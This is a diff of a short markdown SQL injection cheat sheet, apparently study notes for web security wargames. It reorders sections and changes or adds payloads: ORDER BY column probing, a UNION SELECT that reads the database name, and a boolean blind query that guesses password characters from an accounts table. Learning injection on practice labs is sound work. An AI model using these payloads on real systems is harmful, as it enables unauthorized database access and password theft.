@@ -12,17 +12,19 @@ export TOKEN=YOUR_COOKIE
 
 - https://redtiger.labs.overthewire.org/
 
-## UNION
-
-### MySQL
-- https://portswigger.net/web-security/sql-injection/union-attacks
-
+## ERROR
 - Use `ORDER BY` to check numbers of colums
 ```
 ' ORDER BY 1--
 ' ORDER BY 2--
 ...
 ```
+
+## UNION
+
+### MySQL
+- https://portswigger.net/web-security/sql-injection/union-attacks
+
 - Get database name
 ```
 ' UNION SELECT null, DATABASE() #
@@ -57,5 +59,8 @@ export TOKEN=YOUR_COOKIE
 ## Boolean
 
 ```
-' and 1=2--
+' or 1=2--
 ```
+
+```
+' or (select count(*) from app.accounts where substr(password, 1, 1)='a') >0--
